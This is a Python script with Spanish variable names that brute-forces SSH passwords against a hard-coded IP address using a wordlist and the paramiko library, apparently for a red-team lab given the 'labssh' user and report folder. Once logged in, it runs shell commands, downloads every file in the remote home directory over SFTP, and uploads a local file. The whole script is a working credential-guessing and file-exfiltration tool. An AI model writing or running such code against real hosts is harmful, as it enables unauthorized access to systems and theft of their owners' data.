import os
import paramiko

nombre_dict = "dict.txt"
RUTA_LOCAL = os.getcwd()
print(RUTA_LOCAL)
host = "74.179.81.132"

def cargar_dict():
    ruta_dict = RUTA_LOCAL+"/dict.txt"
    claves = []
    try:
        with open(ruta_dict, "r") as archivo:
            for linea in archivo:
                claves.append(linea.strip())
            return claves
    except FileNotFoundError:
        print(f"El archivo '{ruta_dict}' no fue encontrado.")
        
        
def fuerza_bruta_ssh(host, lista_claves):
    if lista_claves == None:
        print("No se ha cargado el diccionario")
        return
    
    cliente = paramiko.SSHClient()
    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for clave in lista_claves:
        try:
            print(f"\nProbando contraseña: {clave}")
            cliente.connect(host, port=22, username="labssh", password=str(clave), look_for_keys=False, allow_agent=False)
            print("Autenticación completada!\n")
            print("-" * 40)

            lista_comandos = ["ls -lha",
                              "ls",
                              "cat dict.txt",
                              ]

            dict_salidas = {}

            for comando in lista_comandos:
                stdin, stdout, stderr = cliente.exec_command(f"{comando}")
                salidas = stdout.read().decode()
                errores= stderr.read().decode()

                dict_salidas[comando] = [salidas, errores]

            for comm, datos in dict_salidas.items():
                print(f"\nEjecutando comando: {comm}:\n")
                if datos[0]:
                    print(f"Salida de consola: \n{datos[0]}")
                else:
                    print("Salida de consola: N/A\n")

                if datos[1]:
                    print(f"Errores de consola: \n{datos[1]}\n")
                else:
                    print("Errores de consola: N/A\n")
                print("-" * 40)
            
            transferir_archivos(cliente)
            break

        except paramiko.AuthenticationException:
            print(f"Intento de autenticación fallido.\n")
        except Exception as e:
            print(f"Error: {e}\n")
            break

    cliente.close()


def transferir_archivos(conexion_ssh):
    sftp = conexion_ssh.open_sftp()
    lista_archivos = sftp.listdir()

    if lista_archivos:
        ruta_arch = "Reportes_Red_Team/Reporte_ssh_brute/Archivos_Extraidos"
        os.makedirs(ruta_arch, exist_ok=True)

        print("\nArchivos encontrados... Descagando...\n")
        for archivo in lista_archivos:
            try:
                sftp.get(archivo, ruta_arch+"/"+archivo)
                print(f"Archivo: {archivo} descargado!!")
            except:
                print(f"\nError al descargar el archivo: {archivo}\n")
        print("-" * 40)

    print("Subiendo archivo local.....\n")
    try:
        sftp.put(RUTA_LOCAL+"/dict.txt", "/home/labssh/dict.txt")
        print("Archivo subido con exito\n")
    except:
        print(f"Error al subir el archivo local")

    sftp.close()


if __name__ == "__main__":
    lista_claves = cargar_dict()
    fuerza_bruta_ssh(host, lista_claves)
